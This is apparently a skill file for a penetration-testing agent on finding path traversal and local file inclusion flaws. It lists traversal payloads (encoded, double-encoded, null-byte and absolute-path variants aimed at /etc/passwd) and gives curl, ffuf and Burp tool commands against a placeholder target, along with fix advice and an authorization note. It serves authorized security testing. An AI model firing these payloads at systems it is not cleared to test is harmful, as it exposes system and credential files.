---
name: testing-path-traversal
description: Test for OWASP A01 Path Traversal / LFI in file-serving parameters — ../, encoded variants, null-byte bypass.
---

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-content-discovery`, `mcp-burp`.

Use this skill when an endpoint serves files by a user-provided name or path parameter. Common indicators include download endpoints, file preview endpoints, or any parameter that accepts a filename or relative path string.

## Signal to look for

- `filename=` parameters
- `path=` parameters
- `file=` parameters
- `doc=` parameters
- File-download endpoints (e.g. `/download`, `/export`, `/fetch`)
- Endpoints that accept relative-looking strings (e.g. `images/logo.png`, `docs/readme`)

## Test steps

1. **Baseline:** Request a known-valid file to confirm normal behavior (e.g. `?file=welcome.txt`). Note the response length, status code, and Content-Type.
2. **Traversal probe:** Replace the filename with `../../../../etc/passwd` and encoded variants:
   - URL-encoded: `%2e%2e%2f` (each `../`)
   - Mixed: `..%2f`
   - Double-encoded: `%252e%252e%252f`
3. **Null-byte bypass** (older systems): Append `%00.txt` to terminate the string early — e.g. `?file=../../../etc/passwd%00.txt`.
4. **Absolute path:** Try `?file=/etc/passwd` directly; some implementations block relative traversal but allow absolute paths.
5. Capture evidence per `methodology-evidence-capture`.

## Tool commands

**Shell:**

```bash
# Basic traversal probe
curl "https://target.example.com/download?file=../../../../etc/passwd"
# Success: response body contains root:x:0:0:

# Fuzz with LFI wordlist
ffuf -u "https://target.example.com/download?file=FUZZ" -w lfi-wordlist.txt -mr "root:"
```

**MCP (Burp):**

```json
// Send traversal request via Burp Repeater
burp_repeater_send(raw_base64=<b64 of traversal request>, host="target.example.com", port=443, secure=true, tab_name="lfi-probe")
// Returns: {"ok": true, "status": 200, "body_b64": "...", ...}

// Inspect a captured proxy request by ID
burp_proxy_request(id=<N>)
// Returns: {"ok": true, "raw_b64": "...", "host": "target.example.com", ...}
```

## Interpret results

File contents appearing in the response body confirm a path traversal vulnerability. Common confirmation markers include `root:x:0:0:` for `/etc/passwd` or recognizable source code for application files.

False positives to watch for:

- **MIME-type filtering:** The server may check the first bytes of a file and block certain content types while allowing others — try multiple target files.
- **Absolute vs. relative paths:** Absolute paths (e.g. `/etc/passwd`) sometimes succeed where relative traversal (`../`) is blocked; always test both forms.
- A `200 OK` with the traversal string echoed back (not file contents) is not a finding — confirm actual file contents are present.

## Finding writeup

- **Title:** Path Traversal in `<parameter>`
- **Severity:** High — arbitrary file read, source-code disclosure, and `/etc/passwd` read are all rated High
- **Evidence** per `methodology-evidence-capture`:
  - Full request URL including the traversal payload
  - Response body containing the retrieved file contents (redact sensitive data as appropriate)
- **Fix:**
  - Canonicalize the supplied path (resolve `..` sequences) and verify the result starts with the allowed base directory before opening the file.
  - Prefer not accepting path input from users at all — map a server-side ID or token to a filename and resolve it server-side.

## References

- OWASP WSTG ATHZ-01: <https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include>
- PortSwigger Directory traversal: <https://portswigger.net/web-security/file-path-traversal>
- CWE-22: <https://cwe.mitre.org/data/definitions/22.html>

## Authorization note

Only use against systems you are authorized to test. This skill assumes the user has obtained written authorization. If authorization is uncertain, stop and confirm scope before proceeding.
